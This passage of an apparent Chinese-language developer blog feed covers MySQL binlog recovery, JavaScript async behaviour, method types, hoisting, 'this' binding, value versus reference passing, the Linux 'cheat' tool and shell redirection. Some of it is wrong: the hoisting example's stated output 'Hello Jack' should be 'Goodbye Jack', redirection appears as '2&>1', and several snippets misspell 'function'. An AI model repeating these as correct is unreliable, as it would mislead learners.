<p>mysql&gt;show variables like ‘log_bin’中查看是否开启</p>
<h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><p>通过时间戳来进行恢复<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlbinlog --stop-date=<span class="string">"2016-07-02 23:57:59"</span> /tmp/mysql-binlog.000001</span><br><span class="line">$ mysql -uroot -p</span><br></pre></td></tr></table></figure></p>
<p>More:  man mysqlbinlog(不过有点多..)</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://blog.chinaunix.net/uid-25266990-id-199887.html" target="_blank" rel="external">Linux里如何查找文件内容-鸟哥</a><br><a href="http://www.dewen.net.cn/q/2654/%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9E%E6%B3%95%E5%8F%AF%E4%BB%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E6%92%A4%E9%94%80mysql%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1%E8%AF%AF%E6%93%8D%E4%BD%9C%EF%BC%9F" target="_blank" rel="external">有什么办法可以方便的撤销mysql中的一次误操作?-德问</a><br><a href="http://www.iteblog.com/mysql-binlog_basic_usage" target="_blank" rel="external">MySQL binlog基本用法</a><br><a href="http://blog.itpub.net/26506993/viewspace-2060130/" target="_blank" rel="external">haven’t provided the mandatory server-id-feelpurple</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[原理上理解js的asynchronous(简)]]></title>
      <url>http://csser.work/05/31/2016/js-asynchronous/</url>
      <content type="html"><![CDATA[<h2 id="–"><a href="#–" class="headerlink" title="–"></a>–</h2><p>看了JavaScript异步编程, 一直没看懂异步的原理, 找了segmentfault才知道是怎么一回事.</p>
<p><strong>example_1</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(obj);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">obj.foo = <span class="string">'bar'</span>;</span><br></pre></td></tr></table></figure></p>
<p>这里会输出<code>Object {foo: &quot;bar&quot;}</code></p>
<p>首先需要了解setTimeout(func, time)是一个<code>异步</code>执行函数, func在这里面就会被<code>回调</code>(简单来说就是被调用), 它先将func放入一个<code>event queue</code>, 之后等外面的函数加载完之后, 它就开始检查event栈中内容,并依次执行.</p>
<p>再一个例子:</p>
<p><strong>example_2</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.foo = <span class="string">'bar'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'log_1: '</span> + <span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'log_2: '</span> + <span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">  <span class="comment">//  多了 bar:foo</span></span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">obj.bar = <span class="string">'foo'</span>;</span><br></pre></td></tr></table></figure></p>
<p>这个例子的两个log就解释了前面的那段话了</p>
<p>如果看了前面两个例子懂了<code>异步回调</code>的话, 再了解一下块级作用域和js作用域(&lt;=ES5)的, 后面两个的区别就很好理解了</p>
<p><strong>example_3</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这些匿名函数都加入了event queue但是var的原因,i从头到尾用的都是同一个内存,所以回调之后的i都变成了4</p>
<p><strong>example_4</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><code>let</code>关键词是ES6的特性,使js拥有块级作用域,然后就是一个简单匿名函数的传值调用啦</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://segmentfault.com/a/1190000003961547" target="_blank" rel="external">同步与异步、异步与回调-苹果小萝卜</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[更换域名了]]></title>
      <url>http://csser.work/05/17/2016/say-new-domain/</url>
      <content type="html"><![CDATA[<p>更新了一个新域名<code>csser.work</code>,不过反正没什么人看..给自己做个记录就好啦~<br>主要也是便宜,还有百度可能不会去收录=, =</p>
<p>这次顺便改了category,这个和tags有点重复,就去掉了.<br>再加了一个sitemap<a href="http://csser.work/sitemap.xml">http://csser.work/sitemap.xml</a>,还要改一堆自己的MD  233</p>
<p>最后重写了各种md文件,emm…看起来舒服多了</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[JS_方法的理解和使用]]></title>
      <url>http://csser.work/05/16/2016/js-methods/</url>
      <content type="html"><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1.前言"></a>0x1.前言</h2><p>发现以前自己还写过一篇原型问题,看到一篇讲protoype的博客发现自己还不清不楚,顺便还介绍了各种方法,记录一下.</p>
<h2 id="0x2-介绍方法"><a href="#0x2-介绍方法" class="headerlink" title="0x2.介绍方法"></a>0x2.介绍方法</h2><p>1.对象方法:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">product</span>(<span class="params">name,price</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.price = price;</span><br><span class="line">  <span class="keyword">this</span>.introduce = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'This product\'s name is: '</span> + <span class="keyword">this</span>.name);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对象方法如名字所说,本质还是一个对象(Object).<br>不过可以用作一个类(class),可以通过new来实例化一个对象<code>var car = new product(&#39;car&#39;,500000)</code>,其中product方法中的this因此将指针指向了car</p>
<p>2.类方法(本质是<code>静态方法</code>)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">product.price = fucntion()&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'The price is :'</span> + <span class="keyword">this</span>.price);<span class="comment">// this -&gt; product</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看作这个函数本身添加了一个名为price属性函数(方法),但是在实例化过程中他<code>不会被携带</code>给实例,因为他没有办法传递(前面的传递是通过this指针来操作的)</p>
<p>3.原型方法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">product.prototype.say = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'The product named '</span> + <span class="keyword">this</span>.name + <span class="string">'values $'</span> + <span class="keyword">this</span>.price);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>总结</code>: 对象方法含有this, 类方法根据对象名添加, 原型方法 class.prototype.func 看一下就行啦</p>
<h2 id="0x3-具体的代码示例-对象VS类方法"><a href="#0x3-具体的代码示例-对象VS类方法" class="headerlink" title="0x3.具体的代码示例(对象VS类方法)"></a>0x3.具体的代码示例(对象VS类方法)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> BaseClass = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="comment">//对象方法</span></span><br><span class="line">  <span class="keyword">this</span>.f1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">' This is a object function.'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">BaseClass.f2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//静态方法(类方法) </span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="string">' This is a static method '</span>); </span><br><span class="line">&#125; </span><br><span class="line">BaseClass.f2();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> BaseClass();<span class="comment">//实例化</span></span><br><span class="line"></span><br><span class="line">instance1.f1();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  instance1.f2();<span class="comment">//instance1.f2 is not a function </span></span><br><span class="line">&#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'---Error:---\n'</span> + err + <span class="string">'\n----'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getOwnPropertyNames(instance1)); <span class="comment">//[ 'f1' ]</span></span><br></pre></td></tr></table></figure>
<h2 id="0x5-同名情况"><a href="#0x5-同名情况" class="headerlink" title="0x5. 同名情况"></a>0x5. 同名情况</h2><p>只考虑对象方法和原型方法同名,类方法上面已经讨论,不纠结=. =<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> product = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> car = <span class="keyword">new</span> product();</span><br><span class="line">product.prototype.func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">car.func(); <span class="comment">//  1</span></span><br><span class="line"><span class="keyword">delete</span> car.func;</span><br><span class="line">car.func(); <span class="comment">//  2</span></span><br></pre></td></tr></table></figure></p>
<p>只有在内置的对象方法被删除之后,语法才会去沿着原型链向上寻找同名函数</p>
<h2 id="0x4-实例调用类方法"><a href="#0x4-实例调用类方法" class="headerlink" title="0x4. 实例调用类方法"></a>0x4. 实例调用类方法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.price.call(object);</span><br></pre></td></tr></table></figure>
<p>利用<code>all</code>或者<code>apply</code>调用过来(个人理解这是将词法作用域/上下文环境复制过来的意思)</p>
<h2 id="0x5-Reference"><a href="#0x5-Reference" class="headerlink" title="0x5. Reference"></a>0x5. Reference</h2><p><a href="http://linder0209.iteye.com/blog/1076172" target="_blank" rel="external">javascript中静态方法、实例方法、内部方法和原型的一点见解_linder0209</a><br><a href="http://www.hi-docs.com/article/detail-MTE=.html" target="_blank" rel="external">JavaScript类方法，对象方法(this)，原型方法(prototype)_hi-docs</a><br><a href="http://www.cnblogs.com/yjf512/archive/2011/06/03/2071914.html#!comments" target="_blank" rel="external">JS中的prototype_轩脉刃</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Js_变量提升]]></title>
      <url>http://csser.work/05/10/2016/js-variable-lift/</url>
      <content type="html"><![CDATA[<h3 id="JavaSript的预编译模式"><a href="#JavaSript的预编译模式" class="headerlink" title="JavaSript的预编译模式"></a>JavaSript的预编译模式</h3><p><strong>预编译模式代码不是从上到下,一行一行解析的!</strong><br><strong>预编译模式代码不是从上到下,一行一行解析的!</strong><br><strong>预编译模式代码不是从上到下,一行一行解析的!</strong></p>
<p>编译阶段,解析引擎会把<code>定义式</code>的函数优先执行,也会把所有<code>var变量创建</code>,默认值为undefined,以提高程序的执行效率！<br>而<code>变量提升</code>的作用也就符合了这个预编译的模式:<br>  在一个函数体内声明的变量,JS解析器都会将其移动到<code>函数体的顶部</code></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><blockquote>
<p>例1</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">'World!'</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">'undefined'</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = <span class="string">'Jack'</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Goodbye '</span> + name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>分析:<br>  这里面虽然有个if,但是归于其<code>预编译模式</code>,所以会爬到<code>var name = &#39;Jack&#39;</code>,因此在函数头会添加一行<code>var name</code>,那么name就变成了一个函数内的局部变量<br>  最终输出<code>Hello Jack</code></p>
<blockquote>
<p>例2</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    a = <span class="number">5</span>;</span><br><span class="line">    alert(<span class="built_in">window</span>.a);</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line">    alert(a);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>分析:<br>  这里面还是需要有一个预编译的思想,这样的话就很容易知道a也会因为后面的<code>var a = 10</code>而引起变量提升变成一个函数内的<code>局部变量</code>,window.a其实根本没有被定义过(<code>undefined</code>)</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://segmentfault.com/search?q=变量提升" target="_blank" rel="external">question:变量提升_SegmentFault</a><br><a href="http://blog.csdn.net/celte/article/details/39412683" target="_blank" rel="external">Celte</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript语言精粹]]></title>
      <url>http://csser.work/05/09/2016/js-invocation-patten/</url>
      <content type="html"><![CDATA[<p>这边讲的是JavaScript的函数调用和this</p>
<h2 id="记读-lt-lt-JavaScript语言精粹-gt-gt"><a href="#记读-lt-lt-JavaScript语言精粹-gt-gt" class="headerlink" title="记读&lt;&lt;JavaScript语言精粹&gt;&gt;"></a>记读<code>&lt;&lt;JavaScript语言精粹&gt;&gt;</code></h2><p>不敢跳过,毕竟这个是THE REAL GOOD PART OF JAVASCRIPT  | XP<br>看完发现自己大部分也差不多了解了, 这个里面的火车图有点想吐槽啊…看得一愣一愣的…</p>
<h2 id="函数调用的几种模式"><a href="#函数调用的几种模式" class="headerlink" title="函数调用的几种模式"></a>函数调用的几种模式</h2><ol>
<li>方法调用（Method Invocation）</li>
<li>函数调用（Function Invocation）</li>
<li>构造函数调用（Constructor Invocation）</li>
<li>apply和call调用（Apply And Call Invocation）</li>
</ol>
<h2 id="方法调用函数调用构造函数调用的区别"><a href="#方法调用函数调用构造函数调用的区别" class="headerlink" title="方法调用函数调用构造函数调用的区别"></a>方法调用<em>函数调用</em>构造函数调用的区别</h2><h3 id="方法调用-Method-Invocation"><a href="#方法调用-Method-Invocation" class="headerlink" title="方法调用    Method Invocation"></a>方法调用    Method Invocation</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">	value: <span class="number">0</span>,</span><br><span class="line">	increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.value ++;</span><br><span class="line">		<span class="comment">//	this --&gt; obj</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.increment();</span><br></pre></td></tr></table></figure>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fucntion add( a, b )&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>);	<span class="comment">//函数调用</span></span><br></pre></td></tr></table></figure>
<h3 id="构造函数调用"><a href="#构造函数调用" class="headerlink" title="构造函数调用"></a>构造函数调用</h3><p>混合了经典的面向对象的语法和自身原型性质(C++和Java中，实例是通过使用<code>new</code>操作符生成)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> instance = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> &#123;</span><br><span class="line">		name: <span class="string">'Nexus'</span>,</span><br><span class="line">		model: <span class="string">'5x'</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> inst1 = <span class="keyword">new</span> instance();</span><br></pre></td></tr></table></figure></p>
<h2 id="函数调用和this"><a href="#函数调用和this" class="headerlink" title="函数调用和this"></a>函数调用和this</h2><p>由于js一开始的设计缺陷,导致存在这个bug:<code>函数调用模式</code>中this会指向一个全局变量<code>window.xxx</code></p>
<h3 id="‘错误’代码"><a href="#‘错误’代码" class="headerlink" title="‘错误’代码"></a>‘错误’代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">500</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">	value: <span class="number">0</span>,</span><br><span class="line">	increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		alert(<span class="keyword">this</span>.value);	<span class="comment">//0	方法调用模式</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> innerFunction = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert(++<span class="keyword">this</span>.value);	<span class="comment">//501 函数调用模式</span></span><br><span class="line">		&#125;</span><br><span class="line">		innerFunction();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.increment();</span><br></pre></td></tr></table></figure>
<p>运行之后可以很明显的看出来第二个alert居然指向了全局的变量window.value<br>原因已经在上文中谈到</p>
<h3 id="代码改进"><a href="#代码改进" class="headerlink" title="代码改进"></a>代码改进</h3><p>利用js函数内声明的变量会存在<code>运行域</code>这个特性,来构造一个that(约定俗成的一个变量名了= =)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">500</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">	value: <span class="number">0</span>,</span><br><span class="line">	increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		alert(<span class="keyword">this</span>.value);	<span class="comment">//0</span></span><br><span class="line">		<span class="keyword">var</span> that = <span class="keyword">this</span>;</span><br><span class="line">		<span class="keyword">var</span> innerFunction = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			alert( ++that.value );	<span class="comment">//1</span></span><br><span class="line">		&#125;</span><br><span class="line">		innerFunction();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.increment();</span><br></pre></td></tr></table></figure></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://doctrina.org/Javascript-Function-Invocation-Patterns.html" target="_blank" rel="external">JavaScript: Function Invocation Patterns</a><br><a href="https://github.com/CoffeeXu/Front-end/blob/master/JavaScript%20Function%20Invocation%20Patterns.md" target="_blank" rel="external">CoffeeXu</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[JS_引用类型和基本类型区别]]></title>
      <url>http://csser.work/05/09/2016/js-stack-heap/</url>
      <content type="html"><![CDATA[<h2 id="实例-听说这是一道简化的JS面试题"><a href="#实例-听说这是一道简化的JS面试题" class="headerlink" title="实例(听说这是一道简化的JS面试题?)"></a>实例(听说这是一道简化的JS面试题?)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testFtn</span>(<span class="params">sNm,pObj</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(sNm);<span class="comment">// 运行结果：new Name</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(pObj.oName);<span class="comment">// 运行结果：new obj</span></span><br><span class="line"></span><br><span class="line">    sNm = <span class="string">"change name"</span>;</span><br><span class="line"></span><br><span class="line">    pObj.oName = <span class="string">"change obj"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sNm = <span class="string">"new Name"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pObj = &#123;oName:<span class="string">"new obj"</span>&#125;;</span><br><span class="line"></span><br><span class="line">testFtn(sNm,pObj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sNm);<span class="comment">// 运行结果：new Name</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(pObj.oName);<span class="comment">// 运行结果：change obj</span></span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看着看着,再结合js的堆栈引用图,然后恍然大悟:这特么不就是<code>C中的传值和传址调用</code>嘛!</p>
<p>函数内基本类型传入的是值,引用类型传入的是地址,所以函数内改变基本类型的形参并没有什么卵用(因为这个形参的作用域只在函数里面,而且用完销毁).引用类型的话传入了地址,所以很正常的可以改变自己的内容</p>
<h3 id="引用图"><a href="#引用图" class="headerlink" title="引用图"></a>引用图</h3><p><img src="/imgs/js_stack_heap/1.png" alt="1"></p>
<h2 id="还有个现成的问题推荐看看"><a href="#还有个现成的问题推荐看看" class="headerlink" title="还有个现成的问题推荐看看"></a>还有个现成的问题推荐看看</h2><p><a href="https://segmentfault.com/q/1010000002417402" target="_blank" rel="external">关于javascript的引用类型</a></p>
<h2 id="Refernce"><a href="#Refernce" class="headerlink" title="Refernce"></a>Refernce</h2><p><a href="https://segmentfault.com" target="_blank" rel="external">SegmentFault</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux佳软推荐_Cheat]]></title>
      <url>http://csser.work/05/08/2016/linux-soft-cheat/</url>
      <content type="html"><![CDATA[<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://linux.cn/article-3760-1.html" target="_blank" rel="external">Cheat—— 给Linux初学者和管理员一个终极命令行”备忘单”</a></p>
<h3 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h3><p>比Man精简,实例操作,妈妈再也不怕我不会bash了!</p>
<h3 id="Enviornment"><a href="#Enviornment" class="headerlink" title="Enviornment"></a>Enviornment</h3><blockquote>
<p>—In Ubuntu 16.04—<br>sudo apt install git<br>sudo apt install python-pip<br>sudo pip install docopt pygments</p>
</blockquote>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><blockquote>
<p>git clone <a href="https://github.com/chrisallenlane/cheat.git" target="_blank" rel="external">https://github.com/chrisallenlane/cheat.git</a><br>cd cheat<br>sudo python setup.py install</p>
</blockquote>
<h3 id="Option"><a href="#Option" class="headerlink" title="Option"></a>Option</h3><p>Edit: ~/.bashrc</p>
<blockquote>
<p>export EDITOR = /usr/bin/vim(一个你喜欢的编辑器)<br>语法高亮:export CHEATCOLOR=true(我设置了好像没什么用..)</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<h3 id="创建备忘单"><a href="#创建备忘单" class="headerlink" title="创建备忘单"></a>创建备忘单</h3><p>cheat备忘单的内容保存在<code>~/.cheat/.</code>目录里</p>
<blockquote>
<p>cheat -e -xyz</p>
</blockquote>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Shell 2>&1 Meaning]]></title>
      <url>http://csser.work/05/08/2016/linux-cmd-redirect/</url>
      <content type="html"><![CDATA[<p>在Segmentfault中看到一个同样的问题,作为笔记记录下来</p>
<h3 id="0x1-amp-含义"><a href="#0x1-amp-含义" class="headerlink" title="0x1 &amp;含义"></a>0x1 &amp;含义</h3><p>重定向<code>&gt; filename 2&amp;&gt;1</code>表示将前面的正确/错误输入都传给后面的filename, 但是<code>&amp;</code>这个概念就不是很清楚</p>
<blockquote>
<p>xelz<br>而2&gt;&amp;1代表将stderr重定向到<code>文件描述符</code>为1的文件(即/dev/stdout)</p>
</blockquote>
<p>所以&amp;就是为了标志1不是一个文件名而是一个文件描述符</p>
<h3 id="0x2-特殊用法-amp-gt-filename"><a href="#0x2-特殊用法-amp-gt-filename" class="headerlink" title="0x2 特殊用法: &amp;&gt; filename"></a>0x2 特殊用法: &amp;&gt; filename</h3><p>整体使用 &amp;&gt; === &gt;&amp;<br>等价于&gt; filename 2&amp;&gt;1</p>
<h3 id="0x3-调用顺序"><a href="#0x3-调用顺序" class="headerlink" title="0x3 调用顺序"></a>0x3 调用顺序</h3><blockquote>
<p>正<br>find / -name ‘desktop’ &gt; tmpfile 2&gt;&amp;1</p>
</blockquote>
